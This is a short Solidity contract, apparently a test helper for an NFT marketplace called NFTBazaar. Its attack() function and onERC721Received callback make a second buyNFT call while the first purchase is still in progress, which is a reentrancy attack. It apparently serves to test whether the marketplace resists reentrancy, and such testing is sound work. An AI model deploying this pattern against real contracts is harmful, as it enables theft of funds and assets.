// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../../src/NFTBazaar.sol";

contract ReentrantBuyer is IERC721Receiver {
    NFTBazaar public immutable bazaar;
    address public immutable nft;
    uint256 public immutable firstId;
    uint256 public immutable secondId;
    uint256 public immutable price;

    constructor(NFTBazaar bazaar_, address nft_, uint256 firstId_, uint256 secondId_, uint256 price_) payable {
        bazaar = bazaar_;
        nft = nft_;
        firstId = firstId_;
        secondId = secondId_;
        price = price_;
    }

    function attack() external {
        bazaar.buyNFT{value: price}(nft, firstId, price, address(0));
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        bazaar.buyNFT{value: price}(nft, secondId, price, address(0));
        return IERC721Receiver.onERC721Received.selector;
    }
}
